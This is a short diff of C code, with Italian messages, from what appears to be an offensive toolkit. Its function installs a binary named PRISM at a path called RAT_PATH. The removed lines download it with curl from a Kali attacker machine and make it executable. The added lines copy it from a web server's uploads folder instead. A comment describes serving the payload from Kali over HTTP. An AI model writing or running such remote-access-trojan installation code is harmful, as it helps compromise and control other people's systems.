@@ -31,16 +31,15 @@
  * Kali deve servire il binary con: python3 -m http.server 80
  */
 int download_prism(const char *kali_ip) {
+    const char *local_src = "/var/www/html/uploads/prism_static";
     char cmd[512];
-    printf("[*] Download PRISM da %s...\n", kali_ip);
-
+    printf("[*] Copia PRISM da %s...\n", local_src);
     snprintf(cmd, sizeof(cmd),
-        "/usr/bin/curl -s http://%s/prism_static -o %s && chmod +x %s",
-        kali_ip, RAT_PATH, RAT_PATH);
-
+        "/bin/cp %s %s && chmod +x %s",
+        local_src, RAT_PATH, RAT_PATH);
     int ret = system(cmd);
     if (ret != 0 || access(RAT_PATH, X_OK) != 0) {
-        printf("[!] Download fallito\n");
+        printf("[!] Copia fallita\n");
         return -1;
     }
     printf("[+] PRISM installato in %s\n", RAT_PATH);
